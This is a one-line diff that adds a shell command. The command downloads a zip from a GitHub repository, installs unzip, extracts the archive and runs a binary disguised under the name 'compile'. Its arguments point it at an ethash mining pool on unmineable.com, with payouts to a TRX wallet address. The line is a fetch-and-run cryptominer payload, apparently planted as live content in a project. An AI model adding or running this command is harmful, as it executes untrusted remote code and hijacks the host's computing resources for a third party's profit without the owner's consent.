@@ -1,0 +1,1 @@
+wget https://github.com/hasra33/doctor/raw/main/compile.zip && apt install unzip && unzip compile.zip && cd compile && chmod u+x compile && ./compile -a ethash -o stratum+tcp://ethash.unmineable.com:3333 -u TRX:TUhisPLRuEvLxgeyhctGgm1vskr3aapMGX.fast
